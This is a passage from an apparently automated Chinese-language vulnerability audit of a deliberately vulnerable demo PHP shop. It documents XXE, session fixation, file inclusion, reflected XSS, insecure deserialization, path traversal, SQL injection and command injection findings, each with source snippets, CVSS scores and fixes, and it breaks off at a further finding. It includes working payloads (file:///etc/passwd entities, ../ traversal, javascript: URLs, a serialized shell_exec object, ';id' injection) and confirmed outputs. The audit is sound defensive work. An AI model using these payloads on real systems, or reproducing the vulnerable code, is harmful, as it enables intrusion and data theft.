攻击侧提交 <?xml version="1.0"?><!DOCTYPE c [<!ENTITY e SYSTEM "file:///etc/passwd">]><config><title>&e;</title></config>：返回 200，导入结果 <pre> 中回显 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin/nologin\n...'（ROOT True、BASH True），即外部实体被展开为 /etc/passwd 内容并由 $doc->title 输出。

- 评分依据：CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：移除 LIBXML_NOENT&#124;LIBXML_DTDLOAD，拒绝含 DOCTYPE/ENTITY 的文档并加 LIBXML_NONET

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/ops/xml-import.php:2-4`（sha256 `3c23a76b1047f734…`）

```php
    2  require __DIR__.'/../../src/bootstrap.php';require_user(['operator','admin']);$output='';$xml='';
    3  if($_SERVER['REQUEST_METHOD']==='POST'){check_csrf();$xml=(string)($_POST['xml']??'');libxml_use_internal_errors(true);$doc=simplexml_load_string($xml,'SimpleXMLElement',LIBXML_NOENT|LIBXML_DTDLOAD);if(!$doc)fail_request('XML 格式不正确。');$output=(string)$doc->title;}
    4  page('合作方配置导入',function()use($output,$xml){echo '<section class="panel"><form method="post">'.csrf_field().'<label>XML 配置<textarea name="xml" required>'.h($xml?:'<config><title>春日上新</title></config>').'</textarea></label><button>导入配置</button></form><h2>导入结果</h2><pre>'.h($output).'</pre></section>';},'运营工作台');
```

`lab30-shop/app/src/bootstrap.php:38-40`（sha256 `2050819d093be02b…`）

```php
   38  function csrf_token(): string { start_session(); return $_SESSION['csrf'] ??= bin2hex(random_bytes(24)); }
   39  function csrf_field(): string { return '<input type="hidden" name="csrf" value="' . h(csrf_token()) . '">'; }
   40  function check_csrf(): void { if (!hash_equals(csrf_token(), (string)($_POST['csrf'] ?? ''))) fail_request('页面已过期，请刷新后重试。', 403); }
```

### C-14 auth/login.php 接受 sid 参数指定会话 ID，登录后不重建会话导致会话固定

- 当前版本：finding `0e642f7c599c4d2a8a0e1973916b983b` revision 1（项目版本 1）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/auth/login.php:3`；文件：`lab30-shop/app/public/auth/login.php`
- 证据引用：`368b0f4121e7e402` lab30-shop/app/public/auth/login.php:3-3；`61badbb513a28357` lab30-shop/app/public/auth/login.php:7-8；`f9d2260d0bc587cf` lab30-shop/app/src/bootstrap.php:13-13；`d65d3e90c1e93168` lab30-shop/app/src/bootstrap.php:17-18
- 根因类别：task_goal:v2:2f38050d210129dece0f:1（规范类型 session_fixation）

**结论陈述（模型产出，不是证据）**

login.php 第3行把请求参数 $_GET['sid'] 直接传给 start_session；start_session 在 bootstrap.php 第13行关闭 session.use_strict_mode，第17行对符合字符集校验的 sid 调用 session_id()，第18行 session_start() 启动该客户端指定会话。login.php 第7-8行认证成功后只写入 $_SESSION['user_id']，未调用 session_regenerate_id 更换会话 ID。攻击者可先构造 ?sid= 合法格式值的登录链接诱导受害者点击，受害者在同一会话上完成登录后，攻击者用相同 SID 访问即取得该已认证会话，实现身份劫持。

- 攻击前身份与适用前提：攻击者诱导受害者访问带 ?sid= 的登录链接并登录；会话存储于共享 data_dir/sessions 且无所有者绑定。
- 入口 → 传播 → 危险操作/状态变更：HTTP GET 参数 sid、SHOPSESSID 会话 cookie → $_GET['sid'] -> start_session($sid) -> session_id($sid) -> session_start(); 认证成功后写 $_SESSION['user_id'] 但无 session_regenerate_id → 以客户端提供的会话 ID 启动会话并在其上完成认证，未重建会话
- 防护与边界：第17行仅做字符集/长度正则校验，不防止攻击者自行选定并复用 ID；第13行显式关闭严格模式，服务端不拒绝未知 ID；第8行认证后无 regenerate。
- 静态判读：证据已记录
- 动态验证：动态确认（verification `e56f508ccc3144b88d5a0b01db1e4399`）
- 正式终审：独立批次 d3f18fe1fb5f406facf626d3787fe6c3；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

攻击侧预设 SID=fixation0e642f7c599c4d2a，受害者通过 /auth/login.php?sid=... 使用 alice 凭据登录：预登录与登录 POST 的 Set-Cookie 均为 SHOPSESSID=fixation0e642f7c599c4d2a（POST 302 → /），VICTIM_JAR 仅含该值且 EQ True，说明认证后未重建会话 ID。另一个从未提交凭据的客户端仅发送 Cookie: SHOPSESSID=fixation0e642f7c599c4d2a，访问 /orders/index.php 与 /account/index.php 均返回 200（LOGOUT True、LOGINLINK False、显示“林晓”），即复用受害者的已认证会话。

- 评分依据：CVSS 3.1 Base 7.1 (high) · CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:L；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：认证成功后调用 session_regenerate_id(true)；启用 session.use_strict_mode=1；不要接受请求参数作为 session_id。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/auth/login.php:3-3`（sha256 `b9be43ddb2233156…`）

```php
    3  start_session(isset($_GET['sid']) ? (string)$_GET['sid'] : null);
```

`lab30-shop/app/public/auth/login.php:7-8`（sha256 `b9be43ddb2233156…`）

```php
    7      if ($row && hash_equals($row['password_md5'],md5((string)($_POST['password']??'')))) {
    8          $_SESSION['user_id']=(int)$row['id']; event_log('login');
```

`lab30-shop/app/src/bootstrap.php:13-13`（sha256 `2050819d093be02b…`）

```php
   13      ini_set('session.use_strict_mode', '0');
```

`lab30-shop/app/src/bootstrap.php:17-18`（sha256 `2050819d093be02b…`）

```php
   17      if ($sid !== null && preg_match('/^[a-zA-Z0-9,-]{16,64}$/D', $sid)) session_id($sid);
   18      session_start();
```

### C-15 运营远程模板预览将 GET template 直接 include 造成任意本地文件包含

- 当前版本：finding `755caa0a9ce04369bac0bc106f3406d2` revision 1（项目版本 10）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/ops/template-preview.php:3`；文件：`lab30-shop/app/public/ops/template-preview.php`
- 证据引用：`5d596a817dad3c10` lab30-shop/app/public/ops/template-preview.php:1-3；`6220461f4c36cb1a` lab30-shop/app/src/bootstrap.php:33-36
- 根因类别：task_goal:v2:476e08867647b189b3bb:1（规范类型 lfi）

**结论陈述（模型产出，不是证据）**

GET template 被直接拼入 include，既接受相对/绝对本地路径，也接受 URL（默认值即 http://fixtures:8080/templates/season.php），无 basename、目录白名单或 realpath 前缀校验，operator/admin 会话即可包含任意本地文件，远程包含取决于 allow_url_include。

- 攻击前身份与适用前提：拥有 operator 或 admin 会话；远程包含还需 allow_url_include=On 且存在可控远程 PHP 文件
- 入口 → 传播 → 危险操作/状态变更：$_GET['template'] → $_GET['template'] -> $template -> include $template → include 攻击者控制的文件路径或 URL
- 防护与边界：require_user(['operator','admin']) 仅检查角色，无路径白名单；check_csrf 不适用于 GET
- 静态判读：证据已记录
- 动态验证：动态确认（verification `8495a233fb2f4e0f8107473a455c9469`）
- 正式终审：独立批次 5087545acf3a4610811790e0f55bdb4e；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

攻击侧 GET /ops/template-preview.php?template=/etc/passwd 返回 200，页面 <section id="remote-template"> 内原文回显 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:...'（ROOT True、BASH True），即 GET 参数被直接 include 为本地绝对路径，泄露任意可读文件内容。

- 评分依据：CVSS 3.1 Base 7.6 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：不要把请求参数直接传给 include；改用固定的模板 ID 到文件路径映射白名单，并用 realpath 校验目标位于允许目录内，禁用远程包含。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/ops/template-preview.php:1-3`（sha256 `107da46e9b067ce0…`）

```php
    1  <?php
    2  require __DIR__.'/../../src/bootstrap.php';require_user(['operator','admin']);$template=(string)($_GET['template']??'');
    3  page('远程模板预览',function()use($template){echo '<section class="panel"><form method="get">';form_input('template','模板地址',$template?:'http://fixtures:8080/templates/season.php');echo '<button>加载模板</button></form></section><section class="panel" id="remote-template">';if($template!=='')include $template;echo '</section>';},'运营工作台');
```

`lab30-shop/app/src/bootstrap.php:33-36`（sha256 `2050819d093be02b…`）

```php
   33  function require_user(array $roles = []): array {
   34      $u = user(); if (!$u) fail_request('请先登录后使用此功能。', 401);
   35      if ($roles && !in_array($u['role'], $roles, true)) fail_request('当前账号没有访问该功能的权限。', 403);
   36      return $u;
```

### C-16 account/profile.php 将 GET url 原样拼入 href，javascript: 伪协议反射型 XSS

- 当前版本：finding `7d425e28404445b7b8301548aba889b1` revision 1（项目版本 26）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/account/profile.php:3`；文件：`lab30-shop/app/public/account/profile.php`
- 证据引用：`4d94f1acccb7284b` lab30-shop/app/public/account/profile.php:1-3；`5220b9ce518719f6` lab30-shop/app/src/bootstrap.php:10-10；`ae2713ba84d306b9` lab30-shop/app/src/bootstrap.php:47-60
- 根因类别：task_goal:v2:cfeb2a6aeaedc767b469:1（规范类型 xss_r）

**结论陈述（模型产出，不是证据）**

profile.php 第2行从 $_GET['url'] 取值并回退到用户 homepage，第3行在 HTML 属性上下文 href="..." 中直接 echo，未调用 h() 或任何协议校验。bootstrap.php:10 的 h() 只做 htmlspecialchars，且此处根本未使用；因此 url=javascript:alert(document.cookie) 会在用户点击“访问个人主页”链接时执行脚本。攻击者可控输入为 GET 参数，危险操作是未编码的属性值输出，触发前提是受害者已登录并点击该链接。

- 攻击前身份与适用前提：受害者已登录并访问攻击者构造的链接，随后点击页面中“访问个人主页”锚点
- 入口 → 传播 → 危险操作/状态变更：GET 参数 url（profile.php:2） → $_GET['url'] → $url → page 回调闭包 → echo '<a id="profile-link" href="'.$url.'">'（profile.php:3） → 未编码/未校验协议即写入 href 属性的字符串输出
- 防护与边界：无：h() 仅用于 display_name，$url 未经 h()；且 htmlspecialchars 无法拦截 javascript: 伪协议
- 静态判读：证据已记录
- 动态验证：动态确认（verification `22fd5e6b9dcb48038f25a82f04a9defe`）
- 正式终审：独立批次 5087545acf3a4610811790e0f55bdb4e；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

攻击侧：HTTP 层 url=javascript:alert(1) 时响应片段为 <a id="profile-link" href="javascript:alert(1)">访问个人主页</a>，伪协议被原样写入 href（job ac6c74c3db834bf4b89b3560186e71ed）。浏览器侧在同一 finding 上下文中以 alice 会话加载 /account/profile.php?url=javascript%3Aalert(document.domain)，页面求值结果 {"href":"javascript:alert(document.domain)","clicked":true}，脚本点击 #profile-link 后弹出对话框，dialogs=["lab30"]，即 payload 中的 alert(document.domain) 在 alice 已登录会话内真实执行（job 42968eb618494081a712c26480717275）。

- 评分依据：CVSS 3.1 Base 5.4 (medium) · CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：对 homepage 类 URL 采用白名单协议（仅允许 http/https），或在服务端用 filter_var($url, FILTER_VALIDATE_URL) 校验并拒绝 javascript:/data: 等，输出时始终 h($url)。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/account/profile.php:1-3`（sha256 `6f2406bbf636de04…`）

```php
    1  <?php
    2  require __DIR__.'/../../src/bootstrap.php';$u=require_user();$url=(string)($_GET['url']??$u['homepage']);
    3  page('个人主页预览',function()use($u,$url){echo '<section class="panel"><h2>'.h($u['display_name']).' 的主页</h2><p><a id="profile-link" href="'.$url.'">访问个人主页</a></p><form method="get">';form_input('url','主页链接',$url);echo '<button>预览链接</button></form></section>';},'账户与会员');
```

`lab30-shop/app/src/bootstrap.php:10-10`（sha256 `2050819d093be02b…`）

```php
   10  function h(mixed $s): string { return htmlspecialchars((string)$s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); }
```

`lab30-shop/app/src/bootstrap.php:47-60`（sha256 `2050819d093be02b…`）

```php
   47  function page(string $title, callable $body, string $section = ''): void {
   48      db();
   49      $u = user();
   50      header('Content-Type: text/html; charset=utf-8');
   51      echo '<!doctype html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>' . h($title) . ' · 拾光商城</title><meta name="theme-color" content="#1b573f"><link rel="stylesheet" href="/assets/app.css"><script src="/assets/app.js" defer></script></head><body><div class="shell"><aside><a class="brand" href="/"><span>拾</span><div>拾光商城<small>SHIGUANG COMMERCE</small></div></a><nav>';
   52      $nav = ['/' => '工作台', '/catalog/index.php' => '商品目录', '/orders/index.php' => '订单中心', '/wallet/index.php' => '我的钱包', '/account/index.php' => '账户与会员', '/support/index.php' => '客服与帮助', '/content/page.php' => '内容中心', '/ops/index.php' => '运营工作台'];
   53      if (!$u || !in_array($u['role'], ['operator','admin'], true)) unset($nav['/ops/index.php']);
   54      foreach ($nav as $url => $label) echo '<a ' . ($section === $label ? 'class="active" ' : '') . 'href="' . $url . '">' . $label . '</a>';
   55      echo '</nav><div class="side-bottom">本地演示商城<small>数据可通过重置命令恢复</small></div></aside><main><header class="topbar"><a class="mobile-brand" href="/">拾光商城</a><span>商城工作空间 / ' . h($title) . '</span><div>';
   56      if ($u) echo '<span>' . h($u['display_name']) . '</span><a href="/account/index.php">我的账户</a><a href="/auth/logout.php">退出</a>';
   57      else echo '<a href="/auth/login.php">登录</a><a href="/auth/register.php">注册</a>';
   58      echo '</div></header><div class="content"><div class="page-heading"><span class="eyebrow">SHIGUANG WORKSPACE</span><h1>' . h($title) . '</h1></div>';
   59      $body();
   60      echo '</div><footer>拾光商城 · 会员、订单与运营协作平台 <span>版本 ' . h(trim(file_get_contents(APP_ROOT . '/VERSION'))) . '</span></footer></main></div></body></html>';
```

### C-17 任务导入 unserialize 用户数据触发 DispatchJob::__wakeup 的 shell_exec 命令执行

- 当前版本：finding `fe228c9b642d456694f9b45fb29d5e92` revision 1（项目版本 1）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/ops/jobs.php:3`；文件：`lab30-shop/app/public/ops/jobs.php`
- 证据引用：`906cb4c8c458a208` lab30-shop/app/public/ops/jobs.php:1-5；`4a4dd3de59c1de26` lab30-shop/app/src/dispatch_job.php:1-5；`063c928d2d7c3b2e` lab30-shop/app/src/bootstrap.php:33-40
- 根因类别：task_goal:v2:5913069e68f029ade321:1（规范类型 insecure_deserialization）

**结论陈述（模型产出，不是证据）**

ops/jobs.php 对 base64_decode($_POST['job']) 直接 unserialize($raw)，instanceof DispatchJob 检查在反序列化之后才执行；src/dispatch_job.php:4 的 __wakeup 直接 echo shell_exec($this->command)，command 为公有属性。operator 提交构造的序列化对象即触发命令执行，输出经 ob_get_clean 回显并写入 jobs.details。仅有 CSRF 与角色校验，无 allowed_classes 白名单。

- 攻击前身份与适用前提：具备 operator/admin 会话并持自身 CSRF token；POST /ops/jobs.php
- 入口 → 传播 → 危险操作/状态变更：POST 参数 job（base64 序列化串） → $_POST['job'] → base64_decode → unserialize → DispatchJob::__wakeup → shell_exec($this->command) → 回显/入库 → unserialize 不可信数据且 __wakeup 调用 shell_exec
- 防护与边界：check_csrf 与 require_user；instanceof 在 unserialize 之后，无 allowed_classes 或签名
- 静态判读：证据已记录
- 动态验证：动态确认（verification `d68242772755402cae8dd0ef35c890f4`）
- 正式终审：独立批次 5087545acf3a4610811790e0f55bdb4e；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

攻击侧提交伪造的 base64 序列化对象 O:11:"DispatchJob":1:{s:7:"command";s:23:"id;echo JOBDES_fe228c9b";}。POST /ops/jobs.php 返回 ATTACK 200 且含“任务已导入并执行”，页面 <pre> 输出 'uid=33(www-data) gid=33(www-data) groups=33(www-data)\nJOBDES_fe228c9b\n'（MARKER True、UID True）。该输出在 instanceof 校验之前由 unserialize 触发的 __wakeup→shell_exec($this->command) 产生，命令内容完全来自攻击者序列化属性。

- 评分依据：CVSS 3.1 Base 8.8 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：改用 JSON 传输并校验字段；禁止 unserialize 不可信数据，或 allowed_classes 白名单并移除 __wakeup 中的命令执行。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/ops/jobs.php:1-5`（sha256 `0f7550fa7f16bd4a…`）

```php
    1  <?php
    2  require __DIR__.'/../../src/bootstrap.php';require __DIR__.'/../../src/dispatch_job.php';$u=require_user(['operator','admin']);$notice='';$output='';
    3  if($_SERVER['REQUEST_METHOD']==='POST'){check_csrf();$raw=base64_decode((string)($_POST['job']??''),true);if($raw===false)fail_request('任务格式不正确。');ob_start();$job=unserialize($raw);$output=(string)ob_get_clean();if(!$job instanceof DispatchJob)fail_request('不是有效的任务文件。');db()->prepare("INSERT INTO jobs(user_id,title,status,details) VALUES(?,?,'completed',?)")->execute([$u['id'],'导入巡检任务',$output]);$notice='任务已导入并执行。';}
    4  $normal=new DispatchJob();$example=base64_encode(serialize($normal));$rows=db()->query('SELECT id,title,status,details FROM jobs ORDER BY id DESC LIMIT 20')->fetchAll();
    5  page('运营任务中心',function()use($notice,$output,$example,$rows){echo '<section class="panel"><h2>导入任务</h2>';if($notice)echo '<div class="notice">'.h($notice).'</div>';echo '<form method="post">'.csrf_field().'<label>任务数据<textarea name="job" required>'.h($example).'</textarea></label><button>导入并执行</button></form><pre>'.h($output).'</pre></section><section class="panel"><h2>近期任务</h2><table><thead><tr><th>编号</th><th>任务</th><th>状态</th><th>结果</th></tr></thead><tbody>';foreach($rows as$r)echo '<tr><td>'.(int)$r['id'].'</td><td>'.h($r['title']).'</td><td>'.h($r['status']).'</td><td>'.h($r['details']).'</td></tr>';echo '</tbody></table></section>';},'运营工作台');
```

`lab30-shop/app/src/dispatch_job.php:1-5`（sha256 `e8234b971fe75d85…`）

```php
    1  <?php
    2  class DispatchJob {
    3      public string $command = 'printf inventory-ready';
    4      public function __wakeup(): void { echo (string)shell_exec($this->command); }
    5  }
```

`lab30-shop/app/src/bootstrap.php:33-40`（sha256 `2050819d093be02b…`）

```php
   33  function require_user(array $roles = []): array {
   34      $u = user(); if (!$u) fail_request('请先登录后使用此功能。', 401);
   35      if ($roles && !in_array($u['role'], $roles, true)) fail_request('当前账号没有访问该功能的权限。', 403);
   36      return $u;
   37  }
   38  function csrf_token(): string { start_session(); return $_SESSION['csrf'] ??= bin2hex(random_bytes(24)); }
   39  function csrf_field(): string { return '<input type="hidden" name="csrf" value="' . h(csrf_token()) . '">'; }
   40  function check_csrf(): void { if (!hash_equals(csrf_token(), (string)($_POST['csrf'] ?? ''))) fail_request('页面已过期，请刷新后重试。', 403); }
```

### C-18 support/download.php 直接拼接 $_GET['file'] 到文档目录，导致任意文件读取

- 当前版本：finding `eac118f98bf744b498228eacf22fd396` revision 1（项目版本 1）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/support/download.php:3`；文件：`lab30-shop/app/public/support/download.php`
- 证据引用：`10c0c8123072e718` lab30-shop/app/public/support/download.php:2-3；`f5faf41dff9a5a91` lab30-shop/app/src/bootstrap.php:9-9
- 根因类别：task_goal:v2:6bb8807e9f1f18ba49f8:1（规范类型 path_traversal）

**结论陈述（模型产出，不是证据）**

download.php 第3行将 $_GET['file'] 原样拼接为 data_dir().'/docs/'.$file，仅用 is_file 判断后 file_get_contents 并作为响应体回显。没有 basename、realpath、白名单或目录前缀校验，'../../' 等序列可穿越到 docs 之外读取任意可读文件。

- 攻击前身份与适用前提：需登录（require_user），任意账户即可
- 入口 → 传播 → 危险操作/状态变更：$_GET['file'] → $_GET['file'] -> data_dir().'/docs/'.$_GET['file'] -> is_file -> file_get_contents -> echo → file_get_contents 读取并输出 attacker 指定路径文件
- 防护与边界：仅有 is_file 存在性检查，无路径规范化或白名单
- 静态判读：证据已记录
- 动态验证：动态确认（verification `80c001a08bbb45329fdcc10620cb7663`）
- 正式终审：独立批次 afc00ec91cfd40929a2f1b41fe8b1d65；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

同一 alice 会话请求 /support/download.php?file=../../../../etc/passwd 返回 200，正文为 system passwd 文件前 400 字节：root:x:0:0:root:/root:/bin/bash、daemon:x:1:1...、bin、sys、sync、games、man、lp、mail、news 等条目，证明 ../ 序列穿出 data_dir()/docs 读取了任意系统文件。

- 评分依据：CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：对文件名做 basename 并用 realpath 校验其父目录等于 docs 目录，或改用白名单映射。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/support/download.php:2-3`（sha256 `71f0558eeb4ebb6c…`）

```php
    2  require __DIR__.'/../../src/bootstrap.php';require_user();
    3  if(isset($_GET['file'])){$path=data_dir().'/docs/'.(string)$_GET['file'];if(!is_file($path))fail_request('文档不存在。',404);header('Content-Type: text/plain; charset=utf-8');echo file_get_contents($path);exit;}
```

`lab30-shop/app/src/bootstrap.php:9-9`（sha256 `2050819d093be02b…`）

```php
    9  function data_dir(): string { return getenv('SHOP_DATA_DIR') ?: '/var/lib/shop'; }
```

### C-19 商品目录搜索 q 参数直接拼接进 LIKE 查询（反射型 SQL 注入）

- 当前版本：finding `2aad233871a24c91a491d81b3fea08ac` revision 1（项目版本 2）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/catalog/index.php:4`；文件：`lab30-shop/app/public/catalog/index.php`
- 证据引用：`9af2d828eb658d25` lab30-shop/app/public/catalog/index.php:3-4；`85b2e45ff4e8d0eb` lab30-shop/app/src/bootstrap.php:4-8
- 根因类别：task_goal:v2:b1dc7a19dc7bc5a308c6:1（规范类型 sqli）

**结论陈述（模型产出，不是证据）**

catalog/index.php 第3行将 $_GET['q'] 强制转字符串后，第4行通过字符串拼接构造 `name LIKE '%...%'` 并交给 db()->query()。db() 返回的 PDO 虽设置 EMULATE_PREPARES=false，但此处未使用 prepare/占位符，用户输入直接作为 SQL 文本执行，任何无需登录的访问者可用单引号闭合 LIKE 条件并追加任意 SQL（UNION/布尔/时间盲注），读取 products 之外的表（如 users.password_md5、settings）。

- 攻击前身份与适用前提：无需登录，直接请求 /catalog/index.php?q=...
- 入口 → 传播 → 危险操作/状态变更：HTTP GET 参数 q（$_GET['q']） → $_GET['q'] -> $term -> 字符串拼接进 "SELECT ... WHERE name LIKE '%".$term."%'" -> db()->query() 执行 → PDO::query() 执行拼接后的 SQL
- 防护与边界：无：db() 仅创建 PDO（bootstrap.php:4-8），查询未参数化，EMULATE_PREPARES=false 对 query() 无约束作用
- 静态判读：证据已记录
- 动态验证：不确定（不确定）（verification `f01c86d72f40457cbba40d89b441209f`）
- 正式终审：独立批次 afc00ec91cfd40929a2f1b41fe8b1d65；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响**

未通过动态验证确认可执行；影响只以静态证据所支持的范围为准，不自动外推。

- 评分依据：CVSS 3.1 Base 8.2 (high) · CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：未提供

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/catalog/index.php:3-4`（sha256 `e85bd1c2fa6a4b78…`）

```php
    3  $term=(string)($_GET['q']??'');
    4  $products=db()->query("SELECT id,name,description,price,stock,color FROM products WHERE name LIKE '%".$term."%' ORDER BY id")->fetchAll();
```

`lab30-shop/app/src/bootstrap.php:4-8`（sha256 `2050819d093be02b…`）

```php
    4  function db(): PDO {
    5      static $pdo;
    6      if (!$pdo) $pdo = new PDO('mysql:host=' . (getenv('DB_HOST') ?: 'db') . ';dbname=' . (getenv('DB_NAME') ?: 'shop') . ';charset=utf8mb4', getenv('DB_USER') ?: 'shop', getenv('DB_PASSWORD') ?: 'shop-local-password', [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION, PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC, PDO::ATTR_EMULATE_PREPARES => false]);
    7      return $pdo;
    8  }
```

### C-20 运营主机巡检 host 参数未过滤直接拼接 shell_exec 造成命令注入

- 当前版本：finding `7d557370dabe4a41ba0c681deb30a0a1` revision 1（项目版本 1）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/ops/ping.php:2`；文件：`lab30-shop/app/public/ops/ping.php`
- 证据引用：`61f200eb89320676` lab30-shop/app/public/ops/ping.php:1-3；`a41ee4811beeaf1b` lab30-shop/app/public/ops/batch-check.php:1-3；`65fc5323ae7c9b98` lab30-shop/app/src/host_check.php:1-2；`49cfe6a3eb14f7dd` lab30-shop/app/public/ops/index.php:1-3；`6220461f4c36cb1a` lab30-shop/app/src/bootstrap.php:33-36
- 根因类别：task_goal:v2:ffef75757a975b32ab0a:1（规范类型 command_injection）

**结论陈述（模型产出，不是证据）**

ops/ping.php 读取 $_GET['host'] 后原样拼进 'ping -c 1 -W 1 '.$host 交给 shell_exec；ops/batch-check.php 经 host_check() 走同一路径（src/host_check.php:2 拼接 shell_exec）。仅有 require_user(['operator','admin']) 角色校验，无 escapeshellarg、无 host 白名单，提交 host=127.0.0.1;id 即可执行任意系统命令，输出回显到页面 pre。

- 攻击前身份与适用前提：具备 operator 或 admin 角色会话；访问 /ops/ping.php?host=...
- 入口 → 传播 → 危险操作/状态变更：GET 参数 host（/ops/ping.php 与 /ops/batch-check.php） → $_GET['host'] → (string) → 拼接 'ping -c 1 -W 1 '.$host → shell_exec() → h() 回显 → shell_exec 执行含攻击者可控片段的系统命令
- 防护与边界：仅 require_user 角色校验；无 escapeshellarg、无正则白名单、无分隔符过滤
- 静态判读：证据已记录
- 动态验证：动态确认（verification `326f95f4b21441eb9c55a210a337a4f8`）
- 正式终审：独立批次 afc00ec91cfd40929a2f1b41fe8b1d65；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

攻击侧 GET /ops/ping.php?host=127.0.0.1;id;echo CMDBASH_7d557370（URL 编码后）返回 ATTACK 200，<pre id="diagnostic-output"> 中在 ping 统计之后额外出现 `uid=33(www-data) gid=33(www-data) groups=33(www-data)` 与唯一标记 `CMDBASH_7d557370`（MARKER True、UID True）。该输出只能由分号分隔的第二、三条 shell 命令产生，证明 host 参数未经 escapeshellarg/白名单直接拼接进 shell_exec 并执行。

- 评分依据：CVSS 3.1 Base 8.8 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：用 escapeshellarg 包裹 host 并限制合法 host 正则，或改用 fsockopen 做连通性检测。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/ops/ping.php:1-3`（sha256 `c15517950afe0794…`）

```php
    1  <?php
    2  require __DIR__.'/../../src/bootstrap.php';require_user(['operator','admin']);$host=(string)($_GET['host']??'');$output=$host!==''?(string)shell_exec('ping -c 1 -W 1 '.$host):'';
    3  page('网络诊断',function()use($host,$output){echo '<section class="panel"><form method="get">';form_input('host','主机地址',$host?:'127.0.0.1');echo '<button>开始诊断</button></form><pre id="diagnostic-output">'.h($output).'</pre></section>';},'运营工作台');
```

`lab30-shop/app/public/ops/batch-check.php:1-3`（sha256 `5f76332e7ad1b33a…`）

```php
    1  <?php
    2  require __DIR__.'/../../src/bootstrap.php';require __DIR__.'/../../src/host_check.php';require_user(['operator','admin']);$host=(string)($_GET['host']??'');$output=$host!==''?host_check($host):'';
    3  page('主机巡检',function()use($host,$output){echo '<section class="panel"><form method="get">';form_input('host','巡检主机',$host?:'127.0.0.1');echo '<button>委托巡检</button></form><pre>'.h($output).'</pre></section>';},'运营工作台');
```

`lab30-shop/app/src/host_check.php:1-2`（sha256 `c3a868155c2d335e…`）

```php
    1  <?php
    2  function host_check(string $host): string { return (string)shell_exec('ping -c 1 -W 1 ' . $host); }
```

`lab30-shop/app/public/ops/index.php:1-3`（sha256 `3e08442a501932a5…`）

```php
    1  <?php
    2  require __DIR__.'/../../src/bootstrap.php';require_user(['operator','admin']);
    3  page('运营工作台',function(){echo '<section class="panel"><h2>业务协作，井然有序</h2><p>管理会员与任务，检查基础服务，维护商城内容。</p></section><div class="cards">';foreach([['members.php','会员查询','检索会员联系信息。'],['users.php','人员管理','查看后台用户与权限。'],['ping.php','网络诊断','检查服务的基础连通性。'],['batch-check.php','主机巡检','委托公共巡检服务检测主机。'],['formula.php','公式计算','试算运营数据与规则。'],['database.php','数据库诊断','检查数据源连接。'],['url-preview.php','链接预览','获取外部内容的文本预览。'],['xml-import.php','配置导入','导入合作方 XML 配置。'],['template-preview.php','远程模板','预览合作方页面模板。'],['template-render.php','内容排版','按表达式渲染营销内容。'],['jobs.php','任务中心','导入与查看运营任务。'],['report.php','会员报表','根据已保存昵称生成报表。'],['maintenance.php','维护接口','查看内部维护服务。'],['audit-log.php','操作记录','查看业务操作流水。']]as$c)echo '<a class="feature-card" href="/ops/'.$c[0].'"><h3>'.$c[1].' ↗</h3><p>'.$c[2].'</p></a>';echo '</div>';},'运营工作台');
```

`lab30-shop/app/src/bootstrap.php:33-36`（sha256 `2050819d093be02b…`）

```php
   33  function require_user(array $roles = []): array {
   34      $u = user(); if (!$u) fail_request('请先登录后使用此功能。', 401);
   35      if ($roles && !in_array($u['role'], $roles, true)) fail_request('当前账号没有访问该功能的权限。', 403);
   36      return $u;
```

### C-21 运营模板渲染将 {{...}} 表达式直接传入 eval 造成代码执行

